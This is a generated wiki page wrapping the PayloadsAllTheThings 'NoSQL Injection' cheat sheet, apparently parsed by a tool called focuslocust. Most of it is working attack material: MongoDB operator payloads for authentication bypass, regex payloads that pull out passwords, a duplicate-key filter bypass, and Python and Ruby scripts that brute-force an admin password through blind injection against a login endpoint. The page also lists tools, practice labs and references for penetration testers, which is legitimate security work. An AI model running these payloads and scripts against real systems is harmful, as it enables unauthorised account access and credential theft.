---
parsed_by: focuslocust
source: payloadsallthethings
type: generated
---
# NoSQL Injection

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `payloadsallthethings` |
| Type | `payload-topic` |
| Record ID | `patt-nosql-injection-readme` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/NoSQL Injection/README.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [NoSQL Injection](../../topics/nosql-injection/nosql-injection.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | patt-nosql-injection-readme |
| name | NoSQL Injection |
| type | payload-topic |
| source | payloadsallthethings |
| url | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/NoSQL%20Injection/README.md |

## Preserved Source Material

````yaml
_body: "# NoSQL Injection\n\n> NoSQL databases provide looser consistency restrictions than traditional SQL databases. By\
  \ requiring fewer relational constraints and consistency checks, NoSQL databases often offer performance and scaling benefits.\
  \ Yet these databases are still potentially vulnerable to injection attacks, even if they aren't using the traditional SQL\
  \ syntax.\n\n## Summary\n\n* [Tools](#tools)\n* [Methodology](#methodology)\n    * [Operator Injection](#operator-injection)\n\
  \    * [Authentication Bypass](#authentication-bypass)\n    * [Extract Length Information](#extract-length-information)\n\
  \    * [Extract Data Information](#extract-data-information)\n    * [WAF and Filters](#waf-and-filters)\n* [Blind NoSQL](#blind-nosql)\n\
  \    * [POST with JSON Body](#post-with-json-body)\n    * [POST with urlencoded Body](#post-with-urlencoded-body)\n    *\
  \ [GET](#get)\n* [Labs](#references)\n* [References](#references)\n\n## Tools\n\n* [codingo/NoSQLmap](https://github.com/codingo/NoSQLMap)\
  \ - Automated NoSQL database enumeration and web application exploitation tool\n* [digininja/nosqlilab](https://github.com/digininja/nosqlilab)\
  \ - A lab for playing with NoSQL Injection\n* [matrix/Burp-NoSQLiScanner](https://github.com/matrix/Burp-NoSQLiScanner)\
  \ - This extension provides a way to discover NoSQL injection vulnerabilities.\n\n## Methodology\n\nNoSQL injection occurs\
  \ when an attacker manipulates queries by injecting malicious input into a NoSQL database query. Unlike SQL injection, NoSQL\
  \ injection often exploits JSON-based queries and operators like `$ne`, `$gt`, `$regex`, or `$where` in MongoDB.\n\n###\
  \ Operator Injection\n\n| Operator | Description        |\n| -------- | ------------------ |\n| $ne      | not equal   \
  \       |\n| $regex   | regular expression |\n| $gt      | greater than       |\n| $lt      | lower than         |\n| $nin\
  \     | not in             |\n\nExample: A web application has a product search feature\n\n```js\ndb.products.find({ \"\
  price\": userInput })\n```\n\nAn attacker can inject a NoSQL query: `{ \"$gt\": 0 }`.\n\n```js\ndb.products.find({ \"price\"\
  : { \"$gt\": 0 } })\n```\n\nInstead of returning a specific product, the database returns all products with a price greater\
  \ than zero, leaking data.\n\n### Authentication Bypass\n\nBasic authentication bypass using not equal (`$ne`) or greater\
  \ (`$gt`)\n\n* HTTP data\n\n  ```ps1\n  username[$ne]=toto&password[$ne]=toto\n  login[$regex]=a.*&pass[$ne]=lol\n  login[$gt]=admin&login[$lt]=test&pass[$ne]=1\n\
  \  login[$nin][]=admin&login[$nin][]=test&pass[$ne]=toto\n  ```\n\n* JSON data\n\n  ```json\n  {\"username\": {\"$ne\":\
  \ null}, \"password\": {\"$ne\": null}}\n  {\"username\": {\"$ne\": \"foo\"}, \"password\": {\"$ne\": \"bar\"}}\n  {\"username\"\
  : {\"$gt\": undefined}, \"password\": {\"$gt\": undefined}}\n  {\"username\": {\"$gt\":\"\"}, \"password\": {\"$gt\":\"\"\
  }}\n  ```\n\n### Extract Length Information\n\nInject a payload using the $regex operator. The injection will work when\
  \ the length is correct.\n\n```ps1\nusername[$ne]=toto&password[$regex]=.{1}\nusername[$ne]=toto&password[$regex]=.{3}\n\
  ```\n\n### Extract Data Information\n\nExtract data with \"`$regex`\" query operator.\n\n* HTTP data\n\n  ```ps1\n  username[$ne]=toto&password[$regex]=m.{2}\n\
  \  username[$ne]=toto&password[$regex]=md.{1}\n  username[$ne]=toto&password[$regex]=mdp\n\n  username[$ne]=toto&password[$regex]=m.*\n\
  \  username[$ne]=toto&password[$regex]=md.*\n  ```\n\n* JSON data\n\n  ```json\n  {\"username\": {\"$eq\": \"admin\"}, \"\
  password\": {\"$regex\": \"^m\" }}\n  {\"username\": {\"$eq\": \"admin\"}, \"password\": {\"$regex\": \"^md\" }}\n  {\"\
  username\": {\"$eq\": \"admin\"}, \"password\": {\"$regex\": \"^mdp\" }}\n  ```\n\nExtract data with \"`$in`\" query operator.\n\
  \n```json\n{\"username\":{\"$in\":[\"Admin\", \"4dm1n\", \"admin\", \"root\", \"administrator\"]},\"password\":{\"$gt\"\
  :\"\"}}\n```\n\n### WAF and Filters\n\n**Remove pre-condition**:\n\nIn MongoDB, if a document contains duplicate keys, only\
  \ the last occurrence of the key will take precedence.\n\n```js\n{\"id\":\"10\", \"id\":\"100\"} \n```\n\nIn this case,\
  \ the final value of \"id\" will be \"100\".\n\n## Blind NoSQL\n\n### POST with JSON Body\n\nPython script:\n\n```python\n\
  import requests\nimport urllib3\nimport string\nimport urllib\nurllib3.disable_warnings()\n\nusername=\"admin\"\npassword=\"\
  \"\nu=\"http://example.org/login\"\nheaders={'content-type': 'application/json'}\n\nwhile True:\n    for c in string.printable:\n\
  \        if c not in ['*','+','.','?','|']:\n            payload='{\"username\": {\"$eq\": \"%s\"}, \"password\": {\"$regex\"\
  : \"^%s\" }}' % (username, password + c)\n            r = requests.post(u, data = payload, headers = headers, verify = False,\
  \ allow_redirects = False)\n            if 'OK' in r.text or r.status_code == 302:\n                print(\"Found one more\
  \ char : %s\" % (password+c))\n                password += c\n```\n\n### POST with urlencoded Body\n\nPython script:\n\n\
  ```python\nimport requests\nimport urllib3\nimport string\nimport urllib\nurllib3.disable_warnings()\n\nusername=\"admin\"\
  \npassword=\"\"\nu=\"http://example.org/login\"\nheaders={'content-type': 'application/x-www-form-urlencoded'}\n\nwhile\
  \ True:\n    for c in string.printable:\n        if c not in ['*','+','.','?','|','&','$']:\n            payload='user=%s&pass[$regex]=^%s&remember=on'\
  \ % (username, password + c)\n            r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects\
  \ = False)\n            if r.status_code == 302 and r.headers['Location'] == '/dashboard':\n                print(\"Found\
  \ one more char : %s\" % (password+c))\n                password += c\n```\n\n### GET\n\nPython script:\n\n```python\nimport\
  \ requests\nimport urllib3\nimport string\nimport urllib\nurllib3.disable_warnings()\n\nusername='admin'\npassword=''\n\
  u='http://example.org/login'\n\nwhile True:\n  for c in string.printable:\n    if c not in ['*','+','.','?','|', '#', '&',\
  \ '$']:\n      payload=f\"?username={username}&password[$regex]=^{password + c}\"\n      r = requests.get(u + payload)\n\
  \      if 'Yeah' in r.text:\n        print(f\"Found one more char : {password+c}\")\n        password += c\n```\n\nRuby\
  \ script:\n\n```ruby\nrequire 'httpx'\n\nusername = 'admin'\npassword = ''\nurl = 'http://example.org/login'\n# CHARSET\
  \ = (?!..?~).to_a # all ASCII printable characters\nCHARSET = [*'0'..'9',*'a'..'z','-'] # alphanumeric + '-'\nGET_EXCLUDE\
  \ = ['*','+','.','?','|', '#', '&', '$']\nsession = HTTPX.plugin(:persistent)\n\nwhile true\n  CHARSET.each do |c|\n   \
  \ unless GET_EXCLUDE.include?(c)\n      payload = \"?username=#{username}&password[$regex]=^#{password + c}\"\n      res\
  \ = session.get(url + payload)\n      if res.body.to_s.match?('Yeah')\n        puts \"Found one more char : #{password +\
  \ c}\"\n        password += c\n      end\n    end\n  end\nend\n```\n\n## Labs\n\n* [Root Me - NoSQL injection - Authentication](https://www.root-me.org/en/Challenges/Web-Server/NoSQL-injection-Authentication)\n\
  * [Root Me - NoSQL injection - Blind](https://www.root-me.org/en/Challenges/Web-Server/NoSQL-injection-Blind)\n\n## References\n\
  \n* [Burp-NoSQLiScanner - matrix - January 30, 2021](https://github.com/matrix/Burp-NoSQLiScanner/blob/main/src/burp/BurpExtender.java)\n\
  * [Getting rid of pre- and post-conditions in NoSQL injections - Reino Mostert - March 11, 2025](https://web.archive.org/web/20260208131430/https://sensepost.com/blog/2025/getting-rid-of-pre-and-post-conditions-in-nosql-injections/)\n\
  * [Les NOSQL injections Classique et Blind: Never trust user input - Geluchat - February 22, 2015](https://web.archive.org/web/20160316144254/http://www.dailysecurity.fr/nosql-injections-classique-blind/)\n\
  * [MongoDB NoSQL Injection with Aggregation Pipelines - Soroush Dalili (@irsdl) - June 23, 2024](https://web.archive.org/web/20240624015518/https://soroush.me/blog/2024/06/mongodb-nosql-injection-with-aggregation-pipelines/)\n\
  * [NoSQL error-based injection - Reino Mostert - March 15, 2025](https://web.archive.org/web/20260208131314/https://sensepost.com/blog/2025/nosql-error-based-injection/)\n\
  * [NoSQL Injection in MongoDB - Zanon - July 17, 2016](https://web.archive.org/web/20160916113057/http://zanon.io:80/posts/nosql-injection-in-mongodb)\n\
  * [NoSQL injection wordlists - cr0hn - May 5, 2021](https://github.com/cr0hn/nosqlinjection_wordlists)\n* [Testing for NoSQL\
  \ injection - OWASP - May 2, 2023](https://web.archive.org/web/20200707120423/https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection)"
_relative_path: NoSQL Injection/README.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/NoSQL Injection/README.md
````
